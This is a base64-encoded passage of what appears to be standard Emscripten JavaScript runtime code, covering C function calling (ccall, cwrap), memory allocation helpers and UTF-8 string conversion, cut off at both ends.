NlbnRpYWxzDQovLz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCg0KLy8gd2hldGhlciB3ZSBhcmUgcXVpdHRpbmcgdGhlIGFwcGxpY2F0aW9uLiBubyBjb2RlIHNob3VsZCBydW4gYWZ0ZXIgdGhpcy4NCi8vIHNldCBpbiBleGl0KCkgYW5kIGFib3J0KCkNCnZhciBBQk9SVCA9IGZhbHNlOw0KDQovLyBzZXQgYnkgZXhpdCgpIGFuZCBhYm9ydCgpLiAgUGFzc2VkIHRvICdvbkV4aXQnIGhhbmRsZXIuDQovLyBOT1RFOiBUaGlzIGlzIGFsc28gdXNlZCBhcyB0aGUgcHJvY2VzcyByZXR1cm4gY29kZSBjb2RlIGluIHNoZWxsIGVudmlyb25tZW50cw0KLy8gYnV0IG9ubHkgd2hlbiBub0V4aXRSdW50aW1lIGlzIGZhbHNlLg0KdmFyIEVYSVRTVEFUVVMgPSAwOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKCosIHN0cmluZz0pfSAqLw0KZnVuY3Rpb24gYXNzZXJ0KGNvbmRpdGlvbiwgdGV4dCkgew0KICBpZiAoIWNvbmRpdGlvbikgew0KICAgIGFib3J0KCdBc3NlcnRpb24gZmFpbGVkOiAnICsgdGV4dCk7DQogIH0NCn0NCg0KLy8gUmV0dXJucyB0aGUgQyBmdW5jdGlvbiB3aXRoIGEgc3BlY2lmaWVkIGlkZW50aWZpZXIgKGZvciBDKyssIHlvdSBuZWVkIHRvIGRvIG1hbnVhbCBuYW1lIG1hbmdsaW5nKQ0KZnVuY3Rpb24gZ2V0Q0Z1bmMoaWRlbnQpIHsNCiAgdmFyIGZ1bmMgPSBNb2R1bGVbJ18nICsgaWRlbnRdOyAvLyBjbG9zdXJlIGV4cG9ydGVkIGZ1bmN0aW9uDQogIGFzc2VydChmdW5jLCAnQ2Fubm90IGNhbGwgdW5rbm93biBmdW5jdGlvbiAnICsgaWRlbnQgKyAnLCBtYWtlIHN1cmUgaXQgaXMgZXhwb3J0ZWQnKTsNCiAgcmV0dXJuIGZ1bmM7DQp9DQoNCi8vIEMgY2FsbGluZyBpbnRlcmZhY2UuDQovKiogQHBhcmFtIHtzdHJpbmd8bnVsbD19IHJldHVyblR5cGUNCiAgICBAcGFyYW0ge0FycmF5PX0gYXJnVHlwZXMNCiAgICBAcGFyYW0ge0FyZ3VtZW50c3xBcnJheT19IGFyZ3MNCiAgICBAcGFyYW0ge09iamVjdD19IG9wdHMgKi8NCmZ1bmN0aW9uIGNjYWxsKGlkZW50LCByZXR1cm5UeXBlLCBhcmdUeXBlcywgYXJncywgb3B0cykgew0KICAvLyBGb3IgZmFzdCBsb29rdXAgb2YgY29udmVyc2lvbiBmdW5jdGlvbnMNCiAgdmFyIHRvQyA9IHsNCiAgICAnc3RyaW5nJzogZnVuY3Rpb24oc3RyKSB7DQogICAgICB2YXIgcmV0ID0gMDsNCiAgICAgIGlmIChzdHIgIT09IG51bGwgJiYgc3RyICE9PSB1bmRlZmluZWQgJiYgc3RyICE9PSAwKSB7IC8vIG51bGwgc3RyaW5nDQogICAgICAgIC8vIGF0IG1vc3QgNCBieXRlcyBwZXIgVVRGLTggY29kZSBwb2ludCwgKzEgZm9yIHRoZSB0cmFpbGluZyAnXDAnDQogICAgICAgIHZhciBsZW4gPSAoc3RyLmxlbmd0aCA8PCAyKSArIDE7DQogICAgICAgIHJldCA9IHN0YWNrQWxsb2MobGVuKTsNCiAgICAgICAgc3RyaW5nVG9VVEY4KHN0ciwgcmV0LCBsZW4pOw0KICAgICAgfQ0KICAgICAgcmV0dXJuIHJldDsNCiAgICB9LA0KICAgICdhcnJheSc6IGZ1bmN0aW9uKGFycikgew0KICAgICAgdmFyIHJldCA9IHN0YWNrQWxsb2MoYXJyLmxlbmd0aCk7DQogICAgICB3cml0ZUFycmF5VG9NZW1vcnkoYXJyLCByZXQpOw0KICAgICAgcmV0dXJuIHJldDsNCiAgICB9DQogIH07DQoNCiAgZnVuY3Rpb24gY29udmVydFJldHVyblZhbHVlKHJldCkgew0KICAgIGlmIChyZXR1cm5UeXBlID09PSAnc3RyaW5nJykgcmV0dXJuIFVURjhUb1N0cmluZyhyZXQpOw0KICAgIGlmIChyZXR1cm5UeXBlID09PSAnYm9vbGVhbicpIHJldHVybiBCb29sZWFuKHJldCk7DQogICAgcmV0dXJuIHJldDsNCiAgfQ0KDQogIHZhciBmdW5jID0gZ2V0Q0Z1bmMoaWRlbnQpOw0KICB2YXIgY0FyZ3MgPSBbXTsNCiAgdmFyIHN0YWNrID0gMDsNCiAgYXNzZXJ0KHJldHVyblR5cGUgIT09ICdhcnJheScsICdSZXR1cm4gdHlwZSBzaG91bGQgbm90IGJlICJhcnJheSIuJyk7DQogIGlmIChhcmdzKSB7DQogICAgZm9yICh2YXIgaSA9IDA7IGkgPCBhcmdzLmxlbmd0aDsgaSsrKSB7DQogICAgICB2YXIgY29udmVydGVyID0gdG9DW2FyZ1R5cGVzW2ldXTsNCiAgICAgIGlmIChjb252ZXJ0ZXIpIHsNCiAgICAgICAgaWYgKHN0YWNrID09PSAwKSBzdGFjayA9IHN0YWNrU2F2ZSgpOw0KICAgICAgICBjQXJnc1tpXSA9IGNvbnZlcnRlcihhcmdzW2ldKTsNCiAgICAgIH0gZWxzZSB7DQogICAgICAgIGNBcmdzW2ldID0gYXJnc1tpXTsNCiAgICAgIH0NCiAgICB9DQogIH0NCiAgdmFyIHJldCA9IGZ1bmMuYXBwbHkobnVsbCwgY0FyZ3MpOw0KDQogIHJldCA9IGNvbnZlcnRSZXR1cm5WYWx1ZShyZXQpOw0KICBpZiAoc3RhY2sgIT09IDApIHN0YWNrUmVzdG9yZShzdGFjayk7DQogIHJldHVybiByZXQ7DQp9DQoNCi8qKiBAcGFyYW0ge3N0cmluZz19IHJldHVyblR5cGUNCiAgICBAcGFyYW0ge0FycmF5PX0gYXJnVHlwZXMNCiAgICBAcGFyYW0ge09iamVjdD19IG9wdHMgKi8NCmZ1bmN0aW9uIGN3cmFwKGlkZW50LCByZXR1cm5UeXBlLCBhcmdUeXBlcywgb3B0cykgew0KICByZXR1cm4gZnVuY3Rpb24oKSB7DQogICAgcmV0dXJuIGNjYWxsKGlkZW50LCByZXR1cm5UeXBlLCBhcmdUeXBlcywgYXJndW1lbnRzLCBvcHRzKTsNCiAgfQ0KfQ0KDQp2YXIgQUxMT0NfTk9STUFMID0gMDsgLy8gVHJpZXMgdG8gdXNlIF9tYWxsb2MoKQ0KdmFyIEFMTE9DX1NUQUNLID0gMTsgLy8gTGl2ZXMgZm9yIHRoZSBkdXJhdGlvbiBvZiB0aGUgY3VycmVudCBmdW5jdGlvbiBjYWxsDQp2YXIgQUxMT0NfRFlOQU1JQyA9IDI7IC8vIENhbm5vdCBiZSBmcmVlZCBleGNlcHQgdGhyb3VnaCBzYnJrDQp2YXIgQUxMT0NfTk9ORSA9IDM7IC8vIERvIG5vdCBhbGxvY2F0ZQ0KDQovLyBhbGxvY2F0ZSgpOiBUaGlzIGlzIGZvciBpbnRlcm5hbCB1c2UuIFlvdSBjYW4gdXNlIGl0IHlvdXJzZWxmIGFzIHdlbGwsIGJ1dCB0aGUgaW50ZXJmYWNlDQovLyAgICAgICAgICAgICBpcyBhIGxpdHRsZSB0cmlja3kgKHNlZSBkb2NzIHJpZ2h0IGJlbG93KS4gVGhlIHJlYXNvbiBpcyB0aGF0IGl0IGlzIG9wdGltaXplZA0KLy8gICAgICAgICAgICAgZm9yIG11bHRpcGxlIHN5bnRheGVzIHRvIHNhdmUgc3BhY2UgaW4gZ2VuZXJhdGVkIGNvZGUuIFNvIHlvdSBzaG91bGQNCi8vICAgICAgICAgICAgIG5vcm1hbGx5IG5vdCB1c2UgYWxsb2NhdGUoKSwgYW5kIGluc3RlYWQgYWxsb2NhdGUgbWVtb3J5IHVzaW5nIF9tYWxsb2MoKSwNCi8vICAgICAgICAgICAgIGluaXRpYWxpemUgaXQgd2l0aCBzZXRWYWx1ZSgpLCBhbmQgc28gZm9ydGguDQovLyBAc2xhYjogQW4gYXJyYXkgb2YgZGF0YSwgb3IgYSBudW1iZXIuIElmIGEgbnVtYmVyLCB0aGVuIHRoZSBzaXplIG9mIHRoZSBibG9jayB0byBhbGxvY2F0ZSwNCi8vICAgICAgICBpbiAqYnl0ZXMqIChub3RlIHRoYXQgdGhpcyBpcyBzb21ldGltZXMgY29uZnVzaW5nOiB0aGUgbmV4dCBwYXJhbWV0ZXIgZG9lcyBub3QNCi8vICAgICAgICBhZmZlY3QgdGhpcyEpDQovLyBAdHlwZXM6IEVpdGhlciBhbiBhcnJheSBvZiB0eXBlcywgb25lIGZvciBlYWNoIGJ5dGUgKG9yIDAgaWYgbm8gdHlwZSBhdCB0aGF0IHBvc2l0aW9uKSwNCi8vICAgICAgICAgb3IgYSBzaW5nbGUgdHlwZSB3aGljaCBpcyB1c2VkIGZvciB0aGUgZW50aXJlIGJsb2NrLiBUaGlzIG9ubHkgbWF0dGVycyBpZiB0aGVyZQ0KLy8gICAgICAgICBpcyBpbml0aWFsIGRhdGEgLSBpZiBAc2xhYiBpcyBhIG51bWJlciwgdGhlbiB0aGlzIGRvZXMgbm90IG1hdHRlciBhdCBhbGwgYW5kIGlzDQovLyAgICAgICAgIGlnbm9yZWQuDQovLyBAYWxsb2NhdG9yOiBIb3cgdG8gYWxsb2NhdGUgbWVtb3J5LCBzZWUgQUxMT0NfKg0KLyoqIEB0eXBlIHtmdW5jdGlvbigoVHlwZWRBcnJheXxBcnJheTxudW1iZXI+fG51bWJlciksIHN0cmluZywgbnVtYmVyLCBudW1iZXI9KX0gKi8NCmZ1bmN0aW9uIGFsbG9jYXRlKHNsYWIsIHR5cGVzLCBhbGxvY2F0b3IsIHB0cikgew0KICB2YXIgemVyb2luaXQsIHNpemU7DQogIGlmICh0eXBlb2Ygc2xhYiA9PT0gJ251bWJlcicpIHsNCiAgICB6ZXJvaW5pdCA9IHRydWU7DQogICAgc2l6ZSA9IHNsYWI7DQogIH0gZWxzZSB7DQogICAgemVyb2luaXQgPSBmYWxzZTsNCiAgICBzaXplID0gc2xhYi5sZW5ndGg7DQogIH0NCg0KICB2YXIgc2luZ2xlVHlwZSA9IHR5cGVvZiB0eXBlcyA9PT0gJ3N0cmluZycgPyB0eXBlcyA6IG51bGw7DQoNCiAgdmFyIHJldDsNCiAgaWYgKGFsbG9jYXRvciA9PSBBTExPQ19OT05FKSB7DQogICAgcmV0ID0gcHRyOw0KICB9IGVsc2Ugew0KICAgIHJldCA9IFtfbWFsbG9jLA0KICAgIHN0YWNrQWxsb2MsDQogICAgZHluYW1pY0FsbG9jXVthbGxvY2F0b3JdKE1hdGgubWF4KHNpemUsIHNpbmdsZVR5cGUgPyAxIDogdHlwZXMubGVuZ3RoKSk7DQogIH0NCg0KICBpZiAoemVyb2luaXQpIHsNCiAgICB2YXIgc3RvcDsNCiAgICBwdHIgPSByZXQ7DQogICAgYXNzZXJ0KChyZXQgJiAzKSA9PSAwKTsNCiAgICBzdG9wID0gcmV0ICsgKHNpemUgJiB+Myk7DQogICAgZm9yICg7IHB0ciA8IHN0b3A7IHB0ciArPSA0KSB7DQogICAgICBIRUFQMzJbKChwdHIpPj4yKV09MDsNCiAgICB9DQogICAgc3RvcCA9IHJldCArIHNpemU7DQogICAgd2hpbGUgKHB0ciA8IHN0b3ApIHsNCiAgICAgIEhFQVA4WygocHRyKyspPj4wKV09MDsNCiAgICB9DQogICAgcmV0dXJuIHJldDsNCiAgfQ0KDQogIGlmIChzaW5nbGVUeXBlID09PSAnaTgnKSB7DQogICAgaWYgKHNsYWIuc3ViYXJyYXkgfHwgc2xhYi5zbGljZSkgew0KICAgICAgSEVBUFU4LnNldCgvKiogQHR5cGUgeyFVaW50OEFycmF5fSAqLyAoc2xhYiksIHJldCk7DQogICAgfSBlbHNlIHsNCiAgICAgIEhFQVBVOC5zZXQobmV3IFVpbnQ4QXJyYXkoc2xhYiksIHJldCk7DQogICAgfQ0KICAgIHJldHVybiByZXQ7DQogIH0NCg0KICB2YXIgaSA9IDAsIHR5cGUsIHR5cGVTaXplLCBwcmV2aW91c1R5cGU7DQogIHdoaWxlIChpIDwgc2l6ZSkgew0KICAgIHZhciBjdXJyID0gc2xhYltpXTsNCg0KICAgIHR5cGUgPSBzaW5nbGVUeXBlIHx8IHR5cGVzW2ldOw0KICAgIGlmICh0eXBlID09PSAwKSB7DQogICAgICBpKys7DQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgYXNzZXJ0KHR5cGUsICdNdXN0IGtub3cgd2hhdCB0eXBlIHRvIHN0b3JlIGluIGFsbG9jYXRlIScpOw0KDQogICAgaWYgKHR5cGUgPT0gJ2k2NCcpIHR5cGUgPSAnaTMyJzsgLy8gc3BlY2lhbCBjYXNlOiB3ZSBoYXZlIG9uZSBpMzIgaGVyZSwgYW5kIG9uZSBpMzIgbGF0ZXINCg0KICAgIHNldFZhbHVlKHJldCtpLCBjdXJyLCB0eXBlKTsNCg0KICAgIC8vIG5vIG5lZWQgdG8gbG9vayB1cCBzaXplIHVubGVzcyB0eXBlIGNoYW5nZXMsIHNvIGNhY2hlIGl0DQogICAgaWYgKHByZXZpb3VzVHlwZSAhPT0gdHlwZSkgew0KICAgICAgdHlwZVNpemUgPSBnZXROYXRpdmVUeXBlU2l6ZSh0eXBlKTsNCiAgICAgIHByZXZpb3VzVHlwZSA9IHR5cGU7DQogICAgfQ0KICAgIGkgKz0gdHlwZVNpemU7DQogIH0NCg0KICByZXR1cm4gcmV0Ow0KfQ0KDQovLyBBbGxvY2F0ZSBtZW1vcnkgZHVyaW5nIGFueSBzdGFnZSBvZiBzdGFydHVwIC0gc3RhdGljIG1lbW9yeSBlYXJseSBvbiwgZHluYW1pYyBtZW1vcnkgbGF0ZXIsIG1hbGxvYyB3aGVuIHJlYWR5DQpmdW5jdGlvbiBnZXRNZW1vcnkoc2l6ZSkgew0KICBpZiAoIXJ1bnRpbWVJbml0aWFsaXplZCkgcmV0dXJuIGR5bmFtaWNBbGxvYyhzaXplKTsNCiAgcmV0dXJuIF9tYWxsb2Moc2l6ZSk7DQp9DQoNCg0KDQoNCi8vIHJ1bnRpbWVfc3RyaW5ncy5qczogU3RyaW5ncyByZWxhdGVkIHJ1bnRpbWUgZnVuY3Rpb25zIHRoYXQgYXJlIHBhcnQgb2YgYm90aCBNSU5JTUFMX1JVTlRJTUUgYW5kIHJlZ3VsYXIgcnVudGltZS4NCg0KLy8gR2l2ZW4gYSBwb2ludGVyICdwdHInIHRvIGEgbnVsbC10ZXJtaW5hdGVkIFVURjgtZW5jb2RlZCBzdHJpbmcgaW4gdGhlIGdpdmVuIGFycmF5IHRoYXQgY29udGFpbnMgdWludDggdmFsdWVzLCByZXR1cm5zDQovLyBhIGNvcHkgb2YgdGhhdCBzdHJpbmcgYXMgYSBKYXZhc2NyaXB0IFN0cmluZyBvYmplY3QuDQoNCnZhciBVVEY4RGVjb2RlciA9IHR5cGVvZiBUZXh0RGVjb2RlciAhPT0gJ3VuZGVmaW5lZCcgPyBuZXcgVGV4dERlY29kZXIoJ3V0ZjgnKSA6IHVuZGVmaW5lZDsNCg0KLyoqDQogKiBAcGFyYW0ge251bWJlcn0gaWR4DQogKiBAcGFyYW0ge251bWJlcj19IG1heEJ5dGVzVG9SZWFkDQogKiBAcmV0dXJuIHtzdHJpbmd9DQogKi8NCmZ1bmN0aW9uIFVURjhBcnJheVRvU3RyaW5nKGhlYXAsIGlkeCwgbWF4Qnl0ZXNUb1JlYWQpIHsNCiAgdmFyIGVuZElkeCA9IGlkeCArIG1heEJ5dGVzVG9SZWFkOw0KICB2YXIgZW5kUHRyID0gaWR4Ow0KICAvLyBUZXh0RGVjb2RlciBuZWVkcyB0byBrbm93IHRoZSBieXRlIGxlbmd0aCBpbiBhZHZhbmNlLCBpdCBkb2Vzbid0IHN0b3Agb24gbnVsbCB0ZXJtaW5hdG9yIGJ5IGl0c2VsZi4NCiAgLy8gQWxzbywgdXNlIHRoZSBsZW5ndGggaW5mbyB0byBhdm9pZCBydW5uaW5nIHRpbnkgc3RyaW5ncyB0aHJvdWdoIFRleHREZWNvZGVyLCBzaW5jZSAuc3ViYXJyYXkoKSBhbGxvY2F0ZXMgZ2FyYmFnZS4NCiAgLy8gKEFzIGEgdGlueSBjb2RlIHNhdmUgdHJpY2ssIGNvbXBhcmUgZW5kUHRyIGFnYWluc3QgZW5kSWR4IHVzaW5nIGEgbmVnYXRpb24sIHNvIHRoYXQgdW5kZWZpbmVkIG1lYW5zIEluZmluaXR5KQ0KICB3aGlsZSAoaGVhcFtlbmRQdHJdICYmICEoZW5kUHRyID49IGVuZElkeCkpICsrZW5kUHRyOw0KDQogIGlmIChlbmRQdHIgLSBpZHggPiAxNiAmJiBoZWFwLnN1YmFycmF5ICYmIFVURjhEZWNvZGVyKSB7DQogICAgcmV0dXJuIFVURjhEZWNvZGVyLmRlY29kZShoZWFwLnN1YmFycmF5KGlkeCwgZW5kUHRyKSk7DQogIH0gZWxzZSB7DQogICAgdmFyIHN0ciA9ICcnOw0KICAgIC8vIElmIGJ1aWxkaW5nIHdpdGggVGV4dERlY29kZXIsIHdlIGhhdmUgYWxyZWFkeSBjb21wdXRlZCB0aGUgc3RyaW5nIGxlbmd0aCBhYm92ZSwgc28gdGVzdCBsb29wIGVuZCBjb25kaXRpb24gYWdhaW5zdCB0aGF0DQogICAgd2hpbGUgKGlkeCA8IGVuZFB0cikgew0KICAgICAgLy8gRm9yIFVURjggYnl0ZSBzdHJ1Y3R1cmUsIHNlZToNCiAgICAgIC8vIGh0dHA6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVVRGLTgjRGVzY3JpcHRpb24NCiAgICAgIC8vIGh0dHBzOi8vd3d3LmlldGYub3JnL3JmYy9yZmMyMjc5LnR4dA0KICAgICAgLy8gaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzM2MjkNCiAgICAgIHZhciB1MCA9IGhlYXBbaWR4KytdOw0KICAgICAgaWYgKCEodTAgJiAweDgwKSkgeyBzdHIgKz0gU3RyaW5nLmZyb21DaGFyQ29kZSh1MCk7IGNvbnRpbnVlOyB9DQogICAgICB2YXIgdTEgPSBoZWFwW2lkeCsrXSAmIDYzOw0KICAgICAgaWYgKCh1MCAmIDB4RTApID09IDB4QzApIHsgc3RyICs9IFN0cmluZy5mcm9tQ2hhckNvZGUoKCh1MCAmIDMxKSA8PCA2KSB8IHUxKTsgY29udGludWU7IH0NCiAgICAgIHZhciB1MiA9IGhlYXBbaWR4KytdICYgNjM7DQogICAgICBpZiAoKHUwICYgMHhGMCkgPT0gMHhFMCkgew0KICAgICAgICB1MCA9ICgodTAgJiAxNSkgPDwgMTIpIHwgKHUxIDw8IDYpIHwgdTI7DQogICAgICB9IGVsc2Ugew0KICAgICAgICBpZiAoKHUwICYgMHhGOCkgIT0gMHhGMCkgd2Fybk9uY2UoJ0ludmFsaWQgVVRGLTggbGVhZGluZyBieXRlIDB4JyArIHUwLnRvU3RyaW5nKDE2KSArICcgZW5jb3VudGVyZWQgd2hlbiBkZXNlcmlhbGl6aW5nIGEgVVRGLTggc3RyaW5nIG9uIHRoZSBhc20uanMvd2FzbSBoZWFwIHRvIGEgSlMgc3RyaW5nIScpOw0KICAgICAgICB1MCA9ICgodTAgJiA3KSA8PCAxOCkgfCAodTEgPDwgMTIpIHwgKHUyIDw8IDYpIHwgKGhlYXBbaWR4KytdICYgNjMpOw0KICAgICAgfQ0KDQogICAgICBpZiAodTAgPCAweDEwMDAwKSB7DQogICAgICAgIHN0ciArPSBTdHJpbmcuZnJvbUNoYXJDb2RlKHUwKTsNCiAgICAgIH0gZWxzZSB7DQogICAgICAgIHZhciBjaCA9IHUwIC0gMHgxMDAwMDsNCiAgICAgICAgc3RyICs9IFN0cmluZy5mcm9tQ2hhckNvZGUoMHhEODAwIHwgKGNoID4+IDEwKSwgMHhEQzAwIHwgKGNoICYgMHgzRkYpKTsNCiAgICAgIH0NCiAgICB9DQogIH0NCiAgcmV0dXJuIHN0cjsNCn0NCg0KLy8gR2l2ZW4gYSBwb2ludGVyICdwdHInIHRvIGEgbnVsbC10ZXJtaW5hdGVkIFVURjgtZW5jb2RlZCBzdHJpbmcgaW4gdGhlIGVtc2NyaXB0ZW4gSEVBUCwgcmV0dXJucyBhDQovLyBjb3B5IG9mIHRoYXQgc3RyaW5nIGFzIGEgSmF2YXNjcmlwdCBTdHJpbmcgb2JqZWN0Lg0KLy8gbWF4Qnl0ZXNUb1JlYWQ6IGFuIG9wdGlvbmFsIGxlbmd0aCB0aGF0IHNwZWNpZmllcyB0aGUgbWF4aW11bSBudW1iZXIgb2YgYnl0ZXMgdG8gcmVhZC4gWW91IGNhbiBvbWl0DQovLyAgICAgICAgICAgICAgICAgdGhpcyBwYXJhbWV0ZXIgdG8gc2NhbiB0aGUgc3RyaW5nIHVudGlsIHRoZSBmaXJzdCBcMCBieXRlLiBJZiBtYXhCeXRlc1RvUmVhZCBpcw0KLy8gICAgICAgICAgICAgICAgIHBhc3NlZCwgYW5kIHRoZSBzdHJpbmcgYXQgW3B0ciwgcHRyK21heEJ5dGVzVG9SZWFkclsgY29udGFpbnMgYSBudWxsIGJ5dGUgaW4gdGhlDQovLyAgICAgICAgICAgICAgICAgbWlkZGxlLCB0aGVuIHRoZSBzdHJpbmcgd2lsbCBjdXQgc2hvcnQgYXQgdGhhdCBieXRlIGluZGV4IChpLmUuIG1heEJ5dGVzVG9SZWFkIHdpbGwNCi8vICAgICAgICAgICAgICAgICBub3QgcHJvZHVjZSBhIHN0cmluZyBvZiBleGFjdCBsZW5ndGggW3B0ciwgcHRyK21heEJ5dGVzVG9SZWFkWykNCi8vICAgICAgICAgICAgICAgICBOLkIuIG1peGluZyBmcmVxdWVudCB1c2VzIG9mIFVURjhUb1N0cmluZygpIHdpdGggYW5kIHdpdGhvdXQgbWF4Qnl0ZXNUb1JlYWQgbWF5DQovLyAgICAgICAgICAgICAgICAgdGhyb3cgSlMgSklUIG9wdGltaXphdGlvbnMgb2ZmLCBzbyBpdCBpcyB3b3J0aCB0byBjb25zaWRlciBjb25zaXN0ZW50bHkgdXNpbmcgb25lDQovLyAgICAgICAgICAgICAgICAgc3R5bGUgb3IgdGhlIG90aGVyLg0KLyoqDQogKiBAcGFyYW0ge251bWJlcn0gcHRyDQogKiBAcGFyYW0ge251bWJlcj19IG1heEJ5dGVzVG9SZWFkDQogKiBAcmV0dXJuIHtzdHJpbmd9DQogKi8NCmZ1bmN0aW9uIFVURjhUb1N0cmluZyhwdHIsIG1heEJ5dGVzVG9SZWFkKSB7DQogIHJldHVybiBwdHIgPyBVVEY4QXJyYXlUb1N0cmluZyhIRUFQVTgsIHB0ciwgbWF4Qnl0ZXNUb1JlYWQpIDogJyc7DQp9DQoNCi8vIENvcGllcyB0aGUgZ2l2ZW4gSmF2YXNjcmlwdCBTdHJpbmcgb2JqZWN0ICdzdHInIHRvIHRoZSBnaXZlbiBieXRlIGFycmF5IGF0IGFkZHJlc3MgJ291dElkeCcsDQovLyBlbmNvZGVkIGluIFVURjggZm9ybSBhbmQgbnVsbC10ZXJtaW5hdGVkLiBUaGUgY29weSB3aWxsIHJlcXVpcmUgYXQgbW9zdCBzdHIubGVuZ3RoKjQrMSBieXRlcyBvZiBzcGFjZSBpbiB0aGUgSEVBUC4NCi8vIFVzZSB0aGUgZnVuY3Rpb24gbGVuZ3RoQnl0ZXNVVEY4IHRvIGNvbXB1dGUgdGhlIGV4YWN0IG51bWJlciBvZiBieXRlcyAoZXhjbHVkaW5nIG51bGwgdGVybWluYXRvcikgdGhhdCB0aGlzIGZ1bmN0aW9uIHdpbGwgd3JpdGUuDQovLyBQYXJhbWV0ZXJzOg0KLy8gICBzdHI6IHRoZSBKYXZhc2NyaXB0IHN0cmluZyB0byBjb3B5Lg0KLy8gICBoZWFwOiB0aGUgYXJyYXkgdG8gY29weSB0by4gRWFjaCBpbmRleCBpbiB0aGlzIGFycmF5IGlzIGFzc3VtZWQgdG8gYmUgb25lIDgtYnl0ZSBlbGVtZW50Lg0KLy8gICBvdXRJZHg6IFRoZSBzdGFydGluZyBvZmZzZXQgaW4gdGhlIGFycmF5IHRvIGJlZ2luIHRoZSBjb3B5aW5nLg0KLy8gICBtYXhCeXRlc1RvV3JpdGU6IFRoZSBtYXhpbXVtIG51bWJlciBvZiBieXRlcyB0aGlzIGZ1bmN0aW9uIGNhbiB3cml0ZSB0byB0aGUgYXJyYXkuDQovLyAgICAgICAgICAgICAgICAgICAgVGhpcyBjb3VudCBzaG91bGQgaW5jbHVkZSB0aGUgbnVsbCB0ZXJtaW5hdG9yLA0KLy8gICAgICAgICAgICAgICAgICAgIGkuZS4gaWYgbWF4Qnl0ZXNUb1dyaXRlPTEsIG9ubHkgdGhlIG51bGwgdGVybWluYXRvciB3aWxsIGJlIHdyaXR0ZW4gYW5kIG5vdGhpbmcgZWxzZS4NCi8vICAgICAgICAgICAgICAgICAgICBtYXhCeXRlc1RvV3JpdGU9MCBkb2VzIG5vdCB3cml0ZSBhbnkgYnl0ZXMgdG8gdGhlIG91dHB1dCwgbm90IGV2ZW4gdGhlIG51bGwgdGVybWluYXRvci4NCi8vIFJldHVybnMgdGhlIG51bWJlciBvZiBieXRlcyB3cml0dGVuLCBFWENMVURJTkcgdGhlIG51bGwgdGVybWluYXRvci4NCg0KZnVuY3Rpb24gc3RyaW5nVG9VVEY4QXJyYXkoc3RyLCBoZWFwLCBvdXRJZHgsIG1heEJ5dGVzVG9Xcml0ZSkgew0KICBpZiAoIShtYXhCeXRlc1RvV3JpdGUgPiAwKSkgLy8gUGFyYW1ldGVyIG1heEJ5dGVzVG9Xcml0ZSBpcyBub3Qgb3B0aW9uYWwuIE5lZ2F0aXZlIHZhbHVlcywgMCwgbnVsbCwgdW5kZWZpbmVkIGFuZCBmYWxzZSBlYWNoIGRvbid0IHdyaXRlIG91dCBhbnkgYnl0ZXMuDQogICAgcmV0dXJuIDA7DQoNCiAgdmFyIHN0YXJ0SWR4ID0gb3V0SWR4Ow0KICB2YXIgZW5kSWR4ID0gb3V0SWR4ICsgbWF4Qnl0ZXNUb1dyaXRlIC0gMTsgLy8gLTEgZm9yIHN0cmluZyBudWxsIHRlcm1pbmF0b3IuDQogIGZvciAodmFyIGkgPSAwOyBpIDwgc3RyLmxlbmd0aDsgKytpKSB7DQogICAgLy8gR290Y2hhOiBjaGFyQ29kZUF0IHJldHVybnMgYSAxNi1iaXQgd29yZCB0aGF0IGlzIGEgVVRGLTE2IGVuY29kZWQgY29kZSB1bml0LCBub3QgYSBVbmljb2RlIGNvZGUgcG9pbnQgb2YgdGhlIGNoYXJhY3RlciEgU28gZGVjb2RlIFVURjE2LT5VVEYzMi0+VVRGOC4NCiAgICAvLyBTZWUgaHR0cDovL3VuaWNvZGUub3JnL2ZhcS91dGZfYm9tLmh0bWwjdXRmMTYtMw0KICAgIC8vIEZvciBVVEY4IGJ5dGUgc3RydWN0dXJlLCBzZWUgaHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9VVEYtOCNEZXNjcmlwdGlvbiBhbmQgaHR0cHM6Ly93d3cuaWV0Zi5vcmcvcmZjL3JmYzIyNzkudHh0IGFuZCBodHRwczovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjMzYyOQ0KICAgIHZhciB1ID0gc3RyLmNoYXJDb2RlQXQoaSk7IC8vIHBvc3NpYmx5IGEgbGVhZCBzdXJyb2dhdGUNCiAgICBpZiAodSA+PSAweEQ4MDAgJiYgdSA8PSAweERGRkYpIHsNCiAgICAgIHZhciB1MSA9IHN0ci5jaGFyQ29kZUF0KCsraSk7DQogICAgICB1ID0gMHgxMDAwMCArICgodSAmIDB4M0ZGKSA8PCAxMCkgfCAodTEgJiAweDNGRik7DQogICAgfQ0KICAgIGlmICh1IDw9IDB4N0YpIHsNCiAgICAgIGlmIChvdXRJZHggPj0gZW5kSWR4KSBicmVhazsNCiAgICAgIGhlYXBbb3V0SWR4KytdID0gdTsNCiAgICB9IGVsc2UgaWYgKHUgPD0gMHg3RkYpIHsNCiAgICAgIGlmIChvdXRJZHggKyAxID49IGVuZElkeCkgYnJlYWs7DQogICAgICBoZWFwW291dElkeCsrXSA9IDB4QzAgfCAodSA+PiA2KTsNCiAgICAgIGhlYXBbb3V0SWR4KytdID0gMHg4MCB8ICh1ICYgNjMpOw0KICAgIH0gZWxzZSBpZiAodSA8PSAweEZGRkYpIHsNCiAgICAgIGlmIChvdXRJZHggKyAyID49IGVuZElkeCkgYnJlYWs7DQogICAgICBoZWFwW291dElkeCsrXSA9IDB4RTAgfCAodSA+PiAxMik7DQogICAgICBoZWFwW291dElkeCsrXSA9IDB4ODAgfCAoKHUgPj4gNikgJiA2Myk7DQogICAgICBoZWFwW291dElkeCsrXSA9IDB4ODAgfCAodSAmIDYzKTsNCiAgICB9IGVsc2Ugew0KICAgICAgaWYgKG91dElkeCArIDMgPj0gZW5kSWR4KSBicmVhazsNCiAgICAgIGlmICh1ID49IDB4MjAwMDAwKSB3YXJuT25jZSgnSW52YWxpZCBVbmljb2RlIGNvZGUgcG9pbnQgMHgnICsgdS50b1N0cmluZygxNikgKyAnIGVuY291bnRlcmVkIHdoZW4gc2VyaWFsaXppbmcgYSBKUyBzdHJpbmcgdG8gYW4gVVRGLTggc3RyaW5nIG9uIHRoZSBhc20uanMvd2FzbSBoZWFwISAoVmFsaWQgdW5pY29kZSBjb2RlIHBvaW50cyBzaG91bGQgYmUgaW4gcmFuZ2UgMC0weDFGRkZGRikuJyk7DQogICAgICBoZWFwW291dElkeCsrXSA9IDB4RjAgfCA